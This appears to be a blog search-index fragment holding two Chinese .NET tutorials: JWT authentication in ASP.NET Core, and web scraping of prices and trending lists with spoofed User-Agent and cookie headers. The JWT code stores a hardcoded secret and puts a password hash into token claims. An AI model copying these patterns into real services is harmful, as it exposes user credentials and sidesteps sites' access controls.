\u0026lt;returns\u0026gt;\u0026lt;/returns\u0026gt; private static IJwtEncoder GetEncoder() { IJwtAlgorithm algorithm = new HMACSHA256Algorithm();//加密方式 IJsonSerializer serializer = new JsonNetSerializer();//序列化Json IBase64UrlEncoder urlEncoder = new JwtBase64UrlEncoder();//base64加解密 IJwtEncoder encoder = new JwtEncoder(algorithm, serializer, urlEncoder);//JWT编码 return encoder; } /// \u0026lt;summary\u0026gt; /// 获取解密密钥 /// \u0026lt;/summary\u0026gt; /// \u0026lt;returns\u0026gt;\u0026lt;/returns\u0026gt; private static IJwtDecoder GetDecoder() { IJsonSerializer serializer = new JsonNetSerializer(); IDateTimeProvider provider = new UtcDateTimeProvider(); IJwtValidator validator = new JwtValidator(serializer, provider); IBase64UrlEncoder urlEncoder = new JwtBase64UrlEncoder(); IJwtAlgorithm algorithm = new HMACSHA256Algorithm(); IJwtDecoder decoder = new JwtDecoder(serializer, validator, urlEncoder, algorithm); return decoder; } /// \u0026lt;summary\u0026gt; /// 加密 /// \u0026lt;/summary\u0026gt; public static string Encode(object payload) { var encoder = GetEncoder(); var token = encoder.Encode(payload, JwtKey); return token; } /// \u0026lt;summary\u0026gt; /// 解密 /// \u0026lt;/summary\u0026gt; public static T Decode\u0026lt;T\u0026gt;(string token) { var decoder = GetDecoder(); var data = decoder.Decode(token, JwtKey); var res = JsonConvert.DeserializeObject\u0026lt;T\u0026gt;(data); return res; } /// \u0026lt;summary\u0026gt; /// 解密，只返回Json文本 /// \u0026lt;/summary\u0026gt; /// \u0026lt;param name=\u0026#34;token\u0026#34;\u0026gt;\u0026lt;/param\u0026gt; /// \u0026lt;returns\u0026gt;\u0026lt;/returns\u0026gt; public static string Decode(string token) { var decoder = GetDecoder(); var data = decoder.Decode(token, JwtKey); return data; } } ​ 把中间的加密算法替换成helper的Encode\nvar token = JwtHelper.Encode(Info); 7.添加token加密类 ​\n调用Decode方法 解密token\n8.测试JWT ​\n{\u0026#34;isOk\u0026#34;:true,\u0026#34;code\u0026#34;:1,\u0026#34;msg\u0026#34;:\u0026#34;登录成功！\u0026#34;,\u0026#34;rsData\u0026#34;:\u0026#34;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJVc2VySWQiOiJhZG1pbiIsIkV4cGlyZXMiOiIyMDI0LTA0LTEwVDAxOjUxOjUwLjk5NDgxNzQrMDA6MDAifQ.eYJovquJFezVhfdLp-Hro2vnMoQsUwgXLkYcZSYEy7U\u0026#34;} 测试解密\n​\n解密成功\n⭐️JwtBearer 9、添加NuGet包Microsoft.AspNetCore.Authentication.JwtBearer ​\n10、在appsettings.json中添加JWT配置节点 \u0026#34;JWT\u0026#34;: { \u0026#34;SecKey\u0026#34;: \u0026#34;im6666666!#@$%@%^^\u0026amp;*(~Czmjklneafguvioszb%yuv\u0026amp;*6WVDf5dw#5dfw6f5w6faW%FW^f5wa65f^AWf56\u0026#34;, //密钥 \u0026#34;Issuer\u0026#34;: \u0026#34;im666\u0026#34;, //发行者 \u0026#34;ExpireSeconds\u0026#34;: 7200 //过期时间 2h }, 11.添加jwt类 using Microsoft.IdentityModel.Tokens; using System.Diagnostics; using System.IdentityModel.Tokens.Jwt; using System.Security.Claims; using System.Text; namespace webapijwttest.Models { /// \u0026lt;summary\u0026gt; /// 授权JWT类 /// \u0026lt;/summary\u0026gt; public class JwtHelper2 { private readonly IConfiguration _configuration; /// \u0026lt;summary\u0026gt; /// Token配置 /// \u0026lt;/summary\u0026gt; /// \u0026lt;param name=\u0026#34;configuration\u0026#34;\u0026gt;\u0026lt;/param\u0026gt; public JwtHelper2(IConfiguration configuration) { _configuration = configuration; } /// \u0026lt;summary\u0026gt; /// 创建Token 这里面可以保存自己想要的信息 /// \u0026lt;/summary\u0026gt; /// \u0026lt;param name=\u0026#34;username\u0026#34;\u0026gt;\u0026lt;/param\u0026gt; /// \u0026lt;param name=\u0026#34;mobile\u0026#34;\u0026gt;\u0026lt;/param\u0026gt; /// \u0026lt;returns\u0026gt;\u0026lt;/returns\u0026gt; public string CreateToken(string username, string mobile) { try { // 1. 定义需要使用到的Claims var claims = new[] { new Claim(\u0026#34;username\u0026#34;, username), new Claim(\u0026#34;mobile\u0026#34;, mobile), /* 可以保存自己想要信息，传参进来即可 new Claim(\u0026#34;sex\u0026#34;, \u0026#34;sex\u0026#34;), new Claim(\u0026#34;limit\u0026#34;, \u0026#34;limit\u0026#34;), new Claim(\u0026#34;head_url\u0026#34;, \u0026#34;xxxxx\u0026#34;) */ }; // 2. 从 appsettings.json 中读取SecretKey var secretKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(_configuration[\u0026#34;Jwt:SecKey\u0026#34;])); // 3. 选择加密算法 var algorithm = SecurityAlgorithms.HmacSha256; // 4. 生成Credentials var signingCredentials = new SigningCredentials(secretKey, algorithm); // 5. 根据以上，生成token var jwtSecurityToken = new JwtSecurityToken( _configuration[\u0026#34;Jwt:Issuer\u0026#34;], //Issuer _configuration[\u0026#34;Jwt:ExpireSeconds\u0026#34;], //ExpireSeconds claims, //Claims, DateTime.Now, //notBefore DateTime.Now.AddSeconds(30), //expires signingCredentials //Credentials ); // 6. 将token变为string var token = new JwtSecurityTokenHandler().WriteToken(jwtSecurityToken); return token; } catch (Exception) { throw; } } /// \u0026lt;summary\u0026gt; /// 获取信息 /// \u0026lt;/summary\u0026gt; /// \u0026lt;param name=\u0026#34;jwt\u0026#34;\u0026gt;\u0026lt;/param\u0026gt; /// \u0026lt;returns\u0026gt;\u0026lt;/returns\u0026gt; public static string ReaderToken(string jwt) { var str = string.Empty; try { //获取Token的三种方式 //第一种直接用JwtSecurityTokenHandler提供的read方法 var jwtHander = new JwtSecurityTokenHandler(); JwtSecurityToken jwtSecurityToken = jwtHander.ReadJwtToken(jwt); str = jwtSecurityToken.ToString(); } catch (Exception ex) { Debug.WriteLine(ex.Message); } return str; } /// \u0026lt;summary\u0026gt; /// 解密jwt /// \u0026lt;/summary\u0026gt; /// \u0026lt;param name=\u0026#34;jwt\u0026#34;\u0026gt;\u0026lt;/param\u0026gt; /// \u0026lt;returns\u0026gt;\u0026lt;/returns\u0026gt; public string JwtDecrypt(string jwt) { StringBuilder sb = new StringBuilder(); try { JwtSecurityTokenHandler tokenHandler = new(); TokenValidationParameters valParam = new(); var securityKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(_configuration[\u0026#34;Jwt:SecKey\u0026#34;])); valParam.IssuerSigningKey = securityKey; valParam.ValidateIssuer = false; valParam.ValidateAudience = false; //解密 ClaimsPrincipal claimsPrincipal = tokenHandler.ValidateToken(jwt, valParam, out SecurityToken secToken); foreach (var claim in claimsPrincipal.Claims) { sb.Append($\u0026#34;{claim.Type}={claim.Value}\u0026#34;); } } catch (Exception ex) { Debug.WriteLine(ex.Message); } return sb.ToString(); } } } 12.Program.cs注册JWT服务 #region JWT服务 // 注册JWT服务 builder.Services.AddSingleton(new JwtHelper2(builder.Configuration)); builder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme).AddJwtBearer(options =\u0026gt; { options.TokenValidationParameters = new TokenValidationParameters() { ValidateIssuer = true, //是否验证Issuer ValidIssuer = builder.Configuration[\u0026#34;Jwt:Issuer\u0026#34;], //发行人Issuer ValidateAudience = false, //是否验证Audience ValidateIssuerSigningKey = true, //是否验证SecurityKey IssuerSigningKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(builder.Configuration[\u0026#34;Jwt:SecKey\u0026#34;])), //SecurityKey ValidateLifetime = true, //是否验证失效时间 ClockSkew = TimeSpan.FromSeconds(30), //过期时间容错值，解决服务器端时间不同步问题（秒） RequireExpirationTime = true, }; } ); #endregion 添加swagger authorization\nbuilder.Services.AddSwaggerGen(c =\u0026gt; { c.SwaggerDoc(\u0026#34;v1\u0026#34;, new OpenApiInfo { Title = \u0026#34;Web API\u0026#34;, Version = \u0026#34;v1\u0026#34; }); //开启注释 var xmlFile = $\u0026#34;{Assembly.GetEntryAssembly().GetName().Name}.xml\u0026#34;; var xmlPath = Path.Combine(AppContext.BaseDirectory, xmlFile);//需要 生成 目录生成XML c.IncludeXmlComments(xmlPath, true); // 配置 JWT Bearer 授权 c.AddSecurityDefinition(\u0026#34;Bearer\u0026#34;, new OpenApiSecurityScheme { Description = \u0026#34;JWT Authorization header using the Bearer scheme\u0026#34;, Name = \u0026#34;Authorization\u0026#34;, In = ParameterLocation.Header, Type = SecuritySchemeType.Http, Scheme = \u0026#34;bearer\u0026#34; }); var securityScheme = new OpenApiSecurityScheme { Reference = new OpenApiReference { Type = ReferenceType.SecurityScheme, Id = \u0026#34;Bearer\u0026#34; } }; var securityRequirement = new OpenApiSecurityRequirement { { securityScheme, new string[] { } } }; c.AddSecurityRequirement(securityRequirement); }); var app = builder.Build(); //启用验证中间件 app.UseAuthentication(); app.UseAuthorization(); 13.添加jwt测试api using Microsoft.AspNetCore.Authorization; using Microsoft.AspNetCore.Identity.Data; using Microsoft.AspNetCore.Mvc; using webapijwttest.Models; namespace webapijwttest.Controllers { [Route(\u0026#34;api/[controller]/[action]\u0026#34;)] [ApiController] public class Jwt2Controller : ControllerBase { private readonly JwtHelper2 _jwt; /// \u0026lt;summary\u0026gt; /// 初始化 /// \u0026lt;/summary\u0026gt; /// \u0026lt;param name=\u0026#34;jwtHelper\u0026#34;\u0026gt;\u0026lt;/param\u0026gt; public Jwt2Controller(JwtHelper2 jwtHelper) { _jwt = jwtHelper; } /// \u0026lt;summary\u0026gt; /// 获取Token /// \u0026lt;/summary\u0026gt; /// \u0026lt;returns\u0026gt;\u0026lt;/returns\u0026gt; [HttpPost] public IActionResult GetToken(LoginRs user) { //参数验证等等.... if (string.IsNullOrEmpty(user.UserId)) { return Ok(\u0026#34;参数异常！\u0026#34;); } //这里可以连接mysql数据库做账号密码验证 //这里可以做Redis缓存验证等等 //这里获取Token，当然，这里也可以选择传结构体过去 var token = _jwt.CreateToken(user.UserId, user.PasswordMD5); //解密后的Token var PWToken = _jwt.JwtDecrypt(token); return Ok(token + \u0026#34;解密后：\u0026#34; + PWToken); } /// \u0026lt;summary\u0026gt; /// 获取自己的详细信息，其中 [Authorize] 就表示要带Token才行 /// \u0026lt;/summary\u0026gt; /// \u0026lt;returns\u0026gt;\u0026lt;/returns\u0026gt; [HttpPost] [Authorize] public IActionResult GetSelfInfo() { //执行到这里，就表示已经验证授权通过了 /* * 这里返回个人信息有两种方式 * 第一种：从Header中的Token信息反向解析出用户账号，再从数据库中查找返回 * 第二种：从Header中的Token信息反向解析出用户账号信息直接返回，当然，在前面创建 Token时，要保存进使用到的Claims中。 */ return Ok(\u0026#34;授权通过了！\u0026#34;); } } } 调用\n​\n检测控制器\nusing Microsoft.AspNetCore.Authorization; using Microsoft.AspNetCore.Mvc; using Newtonsoft.Json; using webapijwttest.Models; // For more information on enabling Web API for empty projects, visit https://go.microsoft.com/fwlink/?LinkID=397860 namespace webapijwttest.Controllers { [Route(\u0026#34;api/[controller]\u0026#34;)] [ApiController] public class AuthController : ControllerBase { private ILogger\u0026lt;AuthController\u0026gt; _logger = null; private JwtHelper2 _iJWTService = null; private readonly IConfiguration _configuration; public AuthController(ILogger\u0026lt;AuthController\u0026gt; logger, JwtHelper2 jWTService, IConfiguration configuration) { this._logger = logger; _iJWTService = jWTService; _configuration = configuration; } [Route(\u0026#34;Get\u0026#34;)] [HttpGet] public IEnumerable\u0026lt;int\u0026gt; Get() {//未加授权认证 return new List\u0026lt;int\u0026gt;() { 1, 3, 5, 7, 9 }; } [Route(\u0026#34;GetData\u0026#34;)] [HttpGet] [Authorize] public List\u0026lt;object\u0026gt; GetData() {//添加了授权认证，需要使用token return new List\u0026lt;object\u0026gt;() { new { userName = \u0026#34;123\u0026#34;, remark = \u0026#34;1234\u0026#34; } }; } [Route(\u0026#34;Login\u0026#34;)] [HttpGet] public string Login(string name, string password) { if (!string.IsNullOrEmpty(name) \u0026amp;\u0026amp; !string.IsNullOrEmpty(password)) { string token = this._iJWTService.CreateToken(name,password); return JsonConvert.SerializeObject(new { result = true, token }); } else { return JsonConvert.SerializeObject(new { result = false, token = \u0026#34;\u0026#34; }); } } } } 调用 ​\n把token放进\n​\n测试GetData ​\n当超过时间调用则GetData失败 ​\nEND🐟🐟🐟\n","permalink":"https://qfsyso.github.io/posts/.net-jwt/","summary":"前言\nJWT (JSON Web Token) 是一种安全传输信息的开放标准，由Header、Payload和Signature三部分组成。它主要用于身份验证、信息交换和授权。JWT可验证用户身份，确保访问权限，实现单点登录，并在客户端和服务器之间安全地交换信息。因其简单、安全和便捷，JWT在现代Web应用中广泛使用。\n用JWT有多个原因：\n无状态的身份验证：JWT允许服务器无需保存用户的会话信息，因为所有必要的信息都存储在令牌本身中。这降低了服务器的存储需求，并提高了系统的可扩展性。\n跨域身份验证：由于JWT是自我包含的，并且可以被轻松传递，因此它非常适合跨域身份验证。用户可以在一个服务上验证身份，然后使用相同的令牌访问另一个服务，从而实现单点登录（SSO）。\n安全性：JWT可以通过使用强大的加密算法（如HS256, RS256等）进行签名，以确保其完整性和真实性。服务器可以使用公钥验证令牌的签名，从而确保它没有被篡改，并且确实是由受信任的颁发者签发的。\n减少数据库查询：由于用户的身份信息都存储在JWT中，服务器无需每次都去数据库中查询用户的身份信息，从而减少了数据库的压力和查询时间。\n可定制性：JWT的Payload部分可以包含自定义的信息，如用户角色、权限等，这使得JWT非常灵活，并可以根据具体需求进行定制。\n易于分发和共享：JWT可以轻松地通过网络传输，并且可以在多个服务和客户端之间共享，这使得它在微服务架构和分布式系统中非常有用。\n标准化和互操作性：JWT是一个开放标准（RFC 7519），这意味着不同的系统和语言都可以使用相同的方式生成和验证JWT，从而提高了系统的互操作性。\n环境 Win10 VS2022 .NET8\n✨ 建立项目jwttest 1.创建TestJwtController ​\n2.下载JWT ​\n3.建实体类 /// \u0026lt;summary\u0026gt; /// 用户信息类 /// \u0026lt;/summary\u0026gt; public class LoginRs { /// \u0026lt;summary\u0026gt; /// 用户ID /// \u0026lt;/summary\u0026gt; public string UserId { get; set; } /// \u0026lt;summary\u0026gt; /// 用户密码 /// \u0026lt;/summary\u0026gt; public string PasswordMD5 { get; set; } } /// \u0026lt;summary\u0026gt; /// 用户登录信息类 /// \u0026lt;/summary\u0026gt; public class LoginInfo { /// \u0026lt;summary\u0026gt; /// 用户信息 /// \u0026lt;/summary\u0026gt; public string UserId { get; set; } /// \u0026lt;summary\u0026gt; /// 检验时间 /// \u0026lt;/summary\u0026gt; public DateTime Expires { get; set; } } /// \u0026lt;summary\u0026gt; /// rsmodel /// \u0026lt;/summary\u0026gt; public class RsModel { /// \u0026lt;summary\u0026gt; /// 是否成功 /// \u0026lt;/summary\u0026gt; public bool isOk { get; set; } /// \u0026lt;summary\u0026gt; /// 返回值 /// \u0026lt;/summary\u0026gt; public int code { get; set; } /// \u0026lt;summary\u0026gt; /// 返回消息 /// \u0026lt;/summary\u0026gt; public string msg { get; set; } /// \u0026lt;summary\u0026gt; /// 返回数据 /// \u0026lt;/summary\u0026gt; public object rsData { get; set; } } 4.","title":".NET JWT "},{"content":"前言 爬虫可以用于外汇，期货，基金，货币，比分，电商，文章等信息的采集。通过数据分析，竞品分析，为商业决策提供数据支持。\n​ 金价暴涨，抓取下今日的金价。\n💡使用HttpClient爬取数据 try { // 创建HttpClient实例 using (var httpClient = new HttpClient()) { //模拟User-Agent httpClient.DefaultRequestHeaders.Add(\u0026#34;User-Agent\u0026#34;, GetUserAgent()); // 发送GET请求并获取响应 xxx.com是某网站的页面~（保护） var response = await httpClient.GetAsync(\u0026#34;https://xxx.com\u0026#34;); response.EnsureSuccessStatusCode(); var htmlContent = await response.Content.ReadAsStringAsync(); } } catch (HttpRequestException ex) { // 处理请求异常 ViewBag.Error = \u0026#34;Failed to retrieve price data: \u0026#34; + ex.Message; } 🚀模拟User-Agent // 生成随机 User-Agent private string GetUserAgent() { string[] userAgents = new string[] { \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36\u0026#34;, \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36\u0026#34;, // }; Random random = new Random(); int index = random.Next(userAgents.Length); return userAgents[index]; } 🤵使用HTML解析库 （HtmlAgilityPack）提取价格\n​\n// 使用HtmlAgilityPack解析HTML var htmlDocument = new HtmlDocument(); htmlDocument.LoadHtml(htmlContent); // 使用XPath表达式选择指定的\u0026lt;tr\u0026gt;元素 var trElement = htmlDocument.DocumentNode.SelectSingleNode(\u0026#34;//tr[contains(@class, \u0026#39;border_ea\u0026#39;) and contains(@class, \u0026#39;noTop_border\u0026#39;)]\u0026#34;); if (trElement != null) { // 获取包含价格的\u0026lt;td\u0026gt;元素 var priceCell = trElement.SelectSingleNode(\u0026#34;.//td[@align=\u0026#39;center\u0026#39;][2]\u0026#34;); if (priceCell != null) { // 提取价格 string price = priceCell.InnerText.Trim(); // 将价格传递给视图 ViewBag.Price = price; } else { ViewBag.Error = \u0026#34;Price cell not found in table row.\u0026#34;; } } else { ViewBag.Error = \u0026#34;Table row not found.\u0026#34;; } 也可以用正则表达式提取\n👌前端Price显示 \u0026lt;h1\u0026gt;Au99.99 Price: @ViewBag.Price\u0026lt;/h1\u0026gt; \u0026lt;h2\u0026gt;@ViewBag.Error\u0026lt;/h2\u0026gt; 🌱运行实例 获取金价Au ​ 也可以通过修改规则取实时Pt的价格\n// 使用XPath表达式选择指定的\u0026lt;tr\u0026gt;元素 var trElements = htmlDocument.DocumentNode.SelectNodes(\u0026#34;//tr[contains(@class, \u0026#39;border_ea\u0026#39;) and contains(@class, \u0026#39;noTop_border \u0026#39;)]\u0026#34;); if (trElements != null) { foreach (var trElement in trElements) { // 获取包含产品名称和价格的\u0026lt;td\u0026gt;元素 var tdElements = trElement.SelectNodes(\u0026#34;./td\u0026#34;); if (tdElements != null \u0026amp;\u0026amp; tdElements.Count \u0026gt;= 5) { // 获取产品名称、最新价、最高价、最低价和今开盘价格 string productName = tdElements[0].InnerText.Trim(); string latestPrice = tdElements[1].InnerText.Trim(); string highestPrice = tdElements[2].InnerText.Trim(); string lowestPrice = tdElements[3].InnerText.Trim(); string openingPrice = tdElements[4].InnerText.Trim(); // 检查产品名称是否为Au99.99或Pt99.95 if (productName == \u0026#34;Au99.99\u0026#34;) { // 将Au99.99价格信息传递给视图 ViewBag.AuLatestPrice = latestPrice; ViewBag.AuHighestPrice = highestPrice; ViewBag.AuLowestPrice = lowestPrice; ViewBag.AuOpeningPrice = openingPrice; } else if (productName == \u0026#34;Pt99.95\u0026#34;) { // 将Pt99.95价格信息传递给视图 ViewBag.PtLatestPrice = latestPrice; ViewBag.PtHighestPrice = highestPrice; ViewBag.PtLowestPrice = lowestPrice; ViewBag.PtOpeningPrice = openingPrice; } } } } 结果如下：\n​\n🧾使用正则表达式解析 通过httpClient请求\npublic async Task\u0026lt;ActionResult\u0026gt; Index() { // 获取当前时间的时间戳 long timestamp = DateTimeOffset.Now.ToUnixTimeMilliseconds(); // 构建URL string url = $\u0026#34;http://www.xxx.cn/xx.js?t={timestamp}\u0026#34;; // 创建HttpClient实例 using (var httpClient = new HttpClient()) { // 设置 User-Agent httpClient.DefaultRequestHeaders.Add(\u0026#34;User-Agent\u0026#34;, GetUserAgent()); try { // 发送GET请求 var response = await httpClient.GetAsync(url); response.EnsureSuccessStatusCode(); // 读取返回的数据 var responseData = await response.Content.ReadAsStringAsync(); // 解析返回的数据 var price = ParseGoldPrice(responseData); // 将价格传递给视图 ViewBag.Price = price; } catch (HttpRequestException ex) { // 处理请求异常 ViewBag.Error = \u0026#34;Failed to retrieve gold price data.\u0026#34;; } } // 返回视图 return View(); } 处理返回价格\n通过正则表达式匹配数据\nprivate decimal ParseGoldPrice(string responseData) { string price = \u0026#34;\u0026#34;; decimal price2 = 0; string data = responseData;// // 匹配价格的正则表达式 string pattern = @\u0026#34;var hq_str_gds_AUTD=\u0026#34;\u0026#34;([^\u0026#34;\u0026#34;]+)\u0026#34;\u0026#34;;\u0026#34;; // 使用正则表达式匹配数据 Match match = Regex.Match(data, pattern); if (match.Success) { // 获取匹配到的价格数据 string priceData = match.Groups[1].Value; // 使用逗号分割数据，取第一个元素作为价格 string[] priceParts = priceData.Split(\u0026#39;,\u0026#39;); price = priceParts[0]; // 将字符串价格转换为decimal类型 price2 = decimal.Parse(price); // 输出提取到的价格 Console.WriteLine(\u0026#34;Gold Price: \u0026#34; + price2); } else { Console.WriteLine(\u0026#34;Price not found in data.\u0026#34;); } // decimal price = decimal.Parse(priceString); return price2; } ​\n💫获取BTC价格 Headers模拟cookie获取BTC价格\nhttpClient.DefaultRequestHeaders.Add(\u0026#34;User-Agent\u0026#34;, GetUserAgent()); httpClient.DefaultRequestHeaders.Add(\u0026#34;Accept\u0026#34;, \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\u0026#34;); httpClient.DefaultRequestHeaders.Add(\u0026#34;Accept-Language\u0026#34;, \u0026#34;zh-CN,zh;q=0.9\u0026#34;); httpClient.DefaultRequestHeaders.Add(\u0026#34;Cache-Control\u0026#34;, \u0026#34;max-age=0\u0026#34;); //cookie httpClient.DefaultRequestHeaders.Add(\u0026#34;Cookie\u0026#34;, \u0026#34;__51uvsct__3ExGyQaAoNSqsSUY=1; __51vcke__3ExGyQaAoNSqsSUY=c91184d5-8826-5ea8-8ddc-a0f3b85c9470; __51vuft__3ExGyQaAoNSqsSUY=1713248151570; PHPSESSI328\u0026#34;); httpClient.DefaultRequestHeaders.Add(\u0026#34;Sec-Ch-Ua\u0026#34;, \u0026#34;\\\u0026#34;Google Chrome\\\u0026#34;;v=\\\u0026#34;123\\\u0026#34;, \\\u0026#34;Not:A-Brand\\\u0026#34;;v=\\\u0026#34;8\\\u0026#34;, \\\u0026#34;Chromium\\\u0026#34;;v=\\\u0026#34;123\\\u0026#34;\u0026#34;); httpClient.DefaultRequestHeaders.Add(\u0026#34;Sec-Ch-Ua-Mobile\u0026#34;, \u0026#34;?0\u0026#34;); httpClient.DefaultRequestHeaders.Add(\u0026#34;Sec-Ch-Ua-Platform\u0026#34;, \u0026#34;\\\u0026#34;Windows\\\u0026#34;\u0026#34;); httpClient.DefaultRequestHeaders.Add(\u0026#34;Sec-Fetch-Dest\u0026#34;, \u0026#34;document\u0026#34;); httpClient.DefaultRequestHeaders.Add(\u0026#34;Sec-Fetch-Mode\u0026#34;, \u0026#34;navigate\u0026#34;); httpClient.DefaultRequestHeaders.Add(\u0026#34;Sec-Fetch-Site\u0026#34;, \u0026#34;none\u0026#34;); httpClient.DefaultRequestHeaders.Add(\u0026#34;Sec-Fetch-User\u0026#34;, \u0026#34;?1\u0026#34;); httpClient.DefaultRequestHeaders.Add(\u0026#34;Upgrade-Insecure-Requests\u0026#34;, \u0026#34;1\u0026#34;); //匹配 var currencyElement = htmlDocument.DocumentNode.SelectSingleNode(\u0026#34;//div[@id=\u0026#39;hr_app_cid_1\u0026#39;]\u0026#34;); if (currencyElement != null) { // 查找包含人民币价格的元素 var priceElement = currencyElement.SelectSingleNode(\u0026#34;.//div[@class=\u0026#39;virtual overflow\u0026#39;]\u0026#34;); if (priceElement != null) { // 提取人民币价格 var chinesePrice = priceElement.InnerText.Trim(); } } 美元价格也是类似的规则，运行结果\n​\n​\n✨获取CSDN热点 ​\n模拟请求，修改规则\nvar httpClient = new HttpClient(); var referer = \u0026#34;xxx\u0026#34;; httpClient.DefaultRequestHeaders.Add(\u0026#34;referer\u0026#34;, referer); httpClient.DefaultRequestHeaders.Add(\u0026#34;User-Agent\u0026#34;, GetUserAgent()); var response = await httpClient.GetAsync(\u0026#34;xxx/\u0026#34;); response.EnsureSuccessStatusCode(); var responseBody = await response.Content.ReadAsStringAsync(); var contentList = new List\u0026lt;Tuple\u0026lt;string, string, string\u0026gt;\u0026gt;(); var htmlDocument = new HtmlDocument(); htmlDocument.LoadHtml(responseBody); // var itemNodes = htmlDocument.DocumentNode.SelectNodes(\u0026#34;//div[contains(@class, \u0026#39;headswiper-item\u0026#39;)]\u0026#34;); var items = htmlDocument.DocumentNode.SelectNodes(\u0026#34;//div[@class=\u0026#39;headswiper-item\u0026#39;]\u0026#34;); if (items != null) { foreach (var item in items) { var titleNode = item.SelectSingleNode(\u0026#34;.//a[@class=\u0026#39;title\u0026#39;]\u0026#34;); var nameNode = item.SelectSingleNode(\u0026#34;.//p[@class=\u0026#39;name\u0026#39;]\u0026#34;); var linkNode = item.SelectSingleNode(\u0026#34;.//a[@class=\u0026#39;title\u0026#39;]\u0026#34;); if (titleNode != null \u0026amp;\u0026amp; nameNode != null \u0026amp;\u0026amp; linkNode != null) { var title = titleNode.InnerText.Trim(); var name = nameNode.InnerText.Trim(); var link = linkNode.GetAttributeValue(\u0026#34;href\u0026#34;, \u0026#34;\u0026#34;); contentList.Add(new Tuple\u0026lt;string, string, string\u0026gt;(title, name, link)); } } } return View(contentList); or 使用正则\n// 使用正则表达式匹配所有符合条件的 div 元素内容 var regex = new Regex(@\u0026#34;\u0026lt;div class=\u0026#34;\u0026#34;headswiper-item\u0026#34;\u0026#34;(.*?)\u0026lt;/div\u0026gt;\u0026#34;, RegexOptions.Singleline); var matches = regex.Matches(responseBody); foreach (Match match in matches) { //去除Vuehtml string s1temp = match.Groups[1].Value.Trim(); int i1 = s1temp.IndexOf(\u0026#34;\u0026gt;\u0026#34;)+1; int i2 = s1temp.Length - i1 - 1; string hotstr = s1temp.Substring(i1, i2); contentList.Add(hotstr); } 运行结果 ​\n🎃 获取编程语言排行榜 var response = await httpClient.GetAsync(\u0026#34;xxx\u0026#34;); response.EnsureSuccessStatusCode(); var htmlContent = await response.Content.ReadAsStringAsync(); var htmlDocument = new HtmlDocument(); htmlDocument.LoadHtml(htmlContent); // 获取表格内容 var table = htmlDocument.DocumentNode.SelectSingleNode(\u0026#34;//table[@class=\u0026#39;w-min min-w-full table-fixed divide-y-2 divide-gray-200 text-sm dark:divide-gray-700\u0026#39;]\u0026#34;); ViewBag.TableContent = table?.OuterHtml; ​\n🖥️获取小破站热门 var httpClient = new HttpClient(); var referer = \u0026#34;https://xxx\u0026#34;; httpClient.DefaultRequestHeaders.Add(\u0026#34;Referer\u0026#34;, referer); httpClient.DefaultRequestHeaders.Add(\u0026#34;User-Agent\u0026#34;, GetUserAgent()); var response = await httpClient.GetAsync(\u0026#34;https://xxx\u0026#34;); response.EnsureSuccessStatusCode(); var responseBody = await response.Content.ReadAsStringAsync(); var jsonRes = Newtonsoft.Json.JsonConvert.DeserializeObject\u0026lt;dynamic\u0026gt;(responseBody); var tempArr = new List\u0026lt;MItem\u0026gt;(); int itid = 1; foreach (var itemj in jsonRes.data.list) { string tt = itemj.keyword.ToString(); // string hot = itemj.hot_value.ToString(); tempArr.Add(new MItem { Index = itid++, Title = tt, Hot = \u0026#34;\u0026#34;, Url = \u0026#34;https://search.bilibili.com/all?keyword=\u0026#34; + tt+ \u0026#34;\u0026amp;order=click\u0026#34;, MobileUrl = \u0026#34;https://search.bilibili.com/all?keyword=\u0026#34; + tt+ \u0026#34;\u0026amp;order=click\u0026#34; }); } var md = new MData { Success = true, Title = \u0026#34;小破站\u0026#34;, Subtitle = \u0026#34;热搜榜\u0026#34;, UpdateTime = DateTime.Now.ToString(\u0026#34;yyyy-MM-dd hh:mm:ss\u0026#34;), Data = tempArr }; public class MData { public bool Success { get; set; } public string Title { get; set; } public string Subtitle { get; set; } public string UpdateTime { get; set; } public List\u0026lt;MItem\u0026gt; Data { get; set; } } public class MItem { public int Index { get; set; } public string Title { get; set; } public string Hot { get; set; } public string Url { get; set; } public string MobileUrl { get; set; } } ​\n⭐获取某音热门 var httpClient = new HttpClient(); var referer = \u0026#34;xxx\u0026#34;; httpClient.DefaultRequestHeaders.Add(\u0026#34;referer\u0026#34;, referer); httpClient.DefaultRequestHeaders.Add(\u0026#34;User-Agent\u0026#34;, GetUserAgent()); var response = await httpClient.GetAsync(\u0026#34;xxx\u0026#34;); response.EnsureSuccessStatusCode(); var responseBody = await response.Content.ReadAsStringAsync(); var jsonRes = Newtonsoft.Json.JsonConvert.DeserializeObject\u0026lt;dynamic\u0026gt;(responseBody); var tempArr = new List\u0026lt;MItem\u0026gt;(); int itid = 1; foreach (var itemj in jsonRes.word_list) { string tt = itemj.word.ToString(); string hot =itemj.hot_value.ToString(); tempArr.Add(new MItem { Index = itid++, Title = tt, Hot = hot, Url = \u0026#34;https://www.douyin.com/search/\u0026#34; + tt, MobileUrl = \u0026#34;https://www.douyin.com/search/\u0026#34; + tt }); } var douyinData = new MData { Success = true, Title = \u0026#34;某音\u0026#34;, Subtitle = \u0026#34;热搜榜\u0026#34;, UpdateTime = DateTime.Now.ToString(\u0026#34;yyyy-MM-dd hh:mm:ss\u0026#34;), Data = tempArr }; ​\n注意：如果目标有IP限制、Cookie、签名等，则需编写相应的对策 。\n此外，还可以通过WinFrom WebBowser控件实现加载完DOM再匹配信息实现爬取效果。\n这里只做抛砖引玉，请勿使用此技术做违法的事情！！！💀\nEND\n","permalink":"https://qfsyso.github.io/posts/.net-spider/","summary":"前言 爬虫可以用于外汇，期货，基金，货币，比分，电商，文章等信息的采集。通过数据分析，竞品分析，为商业决策提供数据支持。\n​ 金价暴涨，抓取下今日的金价。\n💡使用HttpClient爬取数据 try { // 创建HttpClient实例 using (var httpClient = new HttpClient()) { //模拟User-Agent httpClient.DefaultRequestHeaders.Add(\u0026#34;User-Agent\u0026#34;, GetUserAgent()); // 发送GET请求并获取响应 